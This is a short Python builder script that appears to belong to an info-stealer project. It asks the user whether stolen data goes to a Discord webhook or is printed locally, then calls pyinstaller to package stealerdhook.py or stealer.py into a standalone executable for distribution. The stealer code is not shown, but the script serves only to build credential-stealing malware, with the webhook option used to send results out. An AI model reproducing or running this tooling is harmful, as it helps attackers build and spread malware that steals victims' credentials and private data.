import os
from colorama import Fore

mode = input(f"{Fore.BLUE}Send to Discord Webhook or Print Locally? (d or p): ")

if mode == "d":
    print(f"{Fore.YELLOW}Remember to have your webhook in config.json")
    os.system(f"pyinstaller --onefile -F stealerdhook.py")
elif mode == "p":
    os.system(f"pyinstaller --onefile -F stealer.py")
    
print(f"{Fore.GREEN}Dist directory should now have your executable.")